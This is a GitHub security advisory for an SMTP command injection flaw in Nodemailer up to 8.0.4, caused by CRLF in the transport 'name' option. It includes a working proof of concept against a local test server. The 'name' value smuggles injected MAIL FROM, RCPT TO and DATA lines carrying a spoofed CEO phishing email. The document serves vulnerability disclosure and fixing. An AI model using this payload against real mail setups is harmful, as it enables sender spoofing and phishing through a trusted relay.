# [M] Nodemailer Vulnerable to SMTP Command Injection via CRLF in Transport name Option (EHLO/HELO) 

## Summary
Severity: Medium
Advisory: GHSA-vvjj-xcjg-gr5g
CWE: CWE-93
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-vvjj-xcjg-gr5g
Type: github-advisory

## Affected
- npm: `nodemailer` — affected >=0 <8.0.5

## Details
### Summary

Nodemailer versions up to and including 8.0.4 are vulnerable to SMTP command injection via CRLF sequences in the transport `name` configuration option. The `name` value is used directly in the EHLO/HELO SMTP command without any sanitization for carriage return and line feed characters (`\r\n`). An attacker who can influence this option can inject arbitrary SMTP commands, enabling unauthorized email sending, email spoofing, and phishing attacks.

### Details

The vulnerability exists in `lib/smtp-connection/index.js`. When establishing an SMTP connection, the `name` option is concatenated directly into the EHLO command:

```javascript
// lib/smtp-connection/index.js, line 71
this.name = this.options.name || this._getHostname();

// line 1336
this._sendCommand('EHLO ' + this.name);
```

The `_sendCommand` method writes the string directly to the socket followed by `\r\n` (line 1082):

```javascript
this._socket.write(Buffer.from(str + '\r\n', 'utf-8'));
```

If the `name` option contains `\r\n` sequences, each injected line is interpreted by the SMTP server as a separate command. Unlike the `envelope.from` and `envelope.to` fields which are validated for `\r\n` (line 1107-1119), and unlike `envelope.size` which was recently fixed (GHSA-c7w3-x93f-qmm8) by casting to a number, the `name` parameter receives no CRLF sanitization whatsoever.

This is distinct from the previously reported GHSA-c7w3-x93f-qmm8 (envelope.size injection) as it affects a different parameter (`name` vs `size`), uses a different injection point (EHLO command vs MAIL FROM command), and occurs at connection initialization rather than during message sending.

The `name` option is also used in HELO (line 1384) and LHLO (line 1333) commands with the same lack of sanitization.

### PoC

```javascript
const nodemailer = require('nodemailer');
const net = require('net');

// Simple SMTP server to observe injected commands
const server = net.createServer(socket => {
    socket.write('220 test ESMTP\r\n');
    socket.on('data', data => {
        const lines = data.toString().split('\r\n').filter(l => l);
        lines.forEach(line => {
            console.log('SMTP CMD:', line);
            if (line.startsWith('EHLO') || line.startsWith('HELO'))
                socket.write('250 OK\r\n');
            else if (line.startsWith('MAIL FROM'))
                socket.write('250 OK\r\n');
            else if (line.startsWith('RCPT TO'))
                socket.write('250 OK\r\n');
            else if (line === 'DATA')
                socket.write('354 Go\r\n');
            else if (line === '.')
                socket.write('250 OK\r\n');
            else if (line === 'QUIT')
                { socket.write('221 Bye\r\n'); socket.end(); }
            else if (line === 'RSET')
                socket.write('250 OK\r\n');
        });
    });
});

server.listen(0, '127.0.0.1', () => {
    const port = server.address().port;

    // Inject a complete phishing email via EHLO name
    const transport = nodemailer.createTransport({
        host: '127.0.0.1',
        port: port,
        secure: false,
        name: 'legit.host\r\nMAIL FROM:<attacker@evil.com>\r\n'
            + 'RCPT TO:<victim@target.com>\r\nDATA\r\n'
            + 'From: ceo@company.com\r\nTo: victim@target.com\r\n'
            + 'Subject: Urgent\r\n\r\nPhishing content\r\n.\r\nRSET'
    });

    transport.sendMail({
        from: 'legit@example.com',
        to: 'legit-recipient@example.com',
        subject: 'Normal email',
        text: 'Normal content'
    }, () => { server.close(); process.exit(0); });
});
```

Running this PoC shows the SMTP server receives the injected MAIL FROM, RCPT TO, DATA, and phishing email content as separate SMTP commands before the legitimate email is sent.

### Impact

**Who is affected:** Applications that allow users or external input to configure the `name` SMTP transport option. This includes:
- Multi-tenant SaaS platforms with per-tenant SMTP configuration
- Admin panels where SMTP hostname/name settings are stored in databases
- Applications loading SMTP config from environment variables or external sources

**What can an attacker do:**
1. **Send unauthorized emails** to arbitrary recipients by injecting MAIL FROM and RCPT TO commands
2. **Spoof email senders** by injecting arbitrary From headers in the DATA portion
3. **Conduct phishing attacks** using the legitimate SMTP server as a relay
4. **Bypass application-level controls** on email recipients, since the injected commands are processed before the application's intended MAIL FROM/RCPT TO
5. **Perform SMTP reconnaissance** by injecting commands like VRFY or EXPN

The injection occurs at the EHLO stage (before authentication in most SMTP flows), making it particularly dangerous as the injected commands may be processed with the server's trust context.

**Recommended fix:** Sanitize the `name` option by stripping or rejecting CRLF sequences, similar to how `envelope.from` and `envelope.to` are already validated on lines 1107-1119 of `lib/smtp-connection/index.js`. For example:

```javascript
this.name = (this.options.name || this._getHostname()).replace(/[\r\n]/g, '');
```

## References
- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-vvjj-xcjg-gr5g
- https://github.com/nodemailer/nodemailer/commit/0a43876801a420ca528f492eaa01bfc421cc306e
- https://github.com/nodemailer/nodemailer
- https://github.com/nodemailer/nodemailer/releases/tag/v8.0.5
